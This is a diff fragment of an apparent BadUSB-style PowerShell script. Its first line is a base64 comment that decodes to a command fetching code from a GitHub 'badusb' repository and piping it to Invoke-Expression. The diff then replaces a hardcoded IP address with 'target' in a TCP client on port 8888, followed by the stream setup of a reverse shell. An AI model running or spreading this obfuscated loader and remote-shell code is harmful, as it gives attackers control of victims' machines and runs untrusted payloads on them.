@@ -1,6 +1,6 @@
 <# aQB3AHIAIAByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AQwBsAGkAYwBrAGUAcwB0AC8AYgBhAGQAdQBzAGIALwBtAGEAcwB0AGUAcgAvAHUAcwBiADIAfABpAGUAeAA= #>
 
-[System.Net.Sockets.TcpClient]$c = [System.Net.Sockets.TcpClient]::new("13.80.244.81", "8888");
+[System.Net.Sockets.TcpClient]$c = [System.Net.Sockets.TcpClient]::new("target", "8888");
 $s = $c.GetStream();
 [System.IO.StreamReader]$r = [System.IO.StreamReader]::new($s);
 [System.IO.StreamWriter]$w = [System.IO.StreamWriter]::new($s);
